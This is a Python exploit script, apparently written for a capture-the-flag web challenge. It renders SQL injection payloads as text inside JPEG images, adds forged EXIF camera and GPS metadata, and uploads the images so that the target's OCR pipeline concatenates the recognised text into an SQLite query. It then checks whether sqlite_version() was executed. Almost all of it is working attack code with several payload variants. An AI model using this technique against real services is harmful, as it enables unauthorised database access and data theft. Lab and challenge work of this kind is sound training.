# v2_resolve.py — resolve the contradiction. Hypothesis: summary_ocr IS concatenated
# ('...<OCR>...'), so quote-parity breaks it (explains 500/200), but our subqueries stayed
# INSIDE the string (never closed the opening quote -> stored literal). To EXECUTE we must close
# the string. The OCR mangles a leading quote into '*', so we test many ways to deliver a real
# closing quote, and detect execution by sqlite_version() (3.x) appearing.
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=32):
    W=min(1700,max(1000,40+int(len(text)*size*0.58))); H=280
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save("rs.jpg","jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"rs.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("rs.jpg","rb").read()).decode()

def go(painted, desc):
    r=requests.post(f"{BASE}/upload", json={"image":build(painted),"description":desc,"user_id":UID})
    ocr=""
    if r.status_code==200:
        data=requests.get(f"{BASE}/images/{UID}").json()
        row=next((x for x in data if x.get("description")==desc),None)
        ocr=row.get("summary_ocr","") if row else ""
    exe = "3." in str(ocr)
    print(f"{desc:16} {r.status_code} ocr={ocr!r}"+("  <<< EXECUTED!" if exe else ""))
    return r.status_code, ocr

q="'"; V="(SELECT sqlite_version())"
# To EXECUTE, the string must be closed before the subquery. The OCR reads a quote glued to || as
# a real quote (we saw ||' works). So build: <text><closequote>||subquery||<reopenquote>.
# The opening close-quote must be reachable. Try putting a NUMBER+quote+|| so the quote is glued.
print("-- attempts to CLOSE the string then run sqlite_version() --")
go("9"+q+"||"+V+"||"+q+"9", "R_num_both")       # 9'||(V)||'9
go("9"+q+"||"+V, "R_num_open_only")             # 9'||(V)   (INSERT's trailing quote closes)
go(V+"||"+q, "R_sub_first")                      # (V)||'    subquery at very start
go("9"+q+"||"+V+"||"+q+q, "R_num_dq_close")     # 9'||(V)||''
go("z9"+q+"||"+V+"||"+q+"z", "R_anchor")        # z9'||(V)||'z
# also: maybe the field is NOT concat and 500 came from OCR pipeline. A control:
go("plaintext123", "R_control")
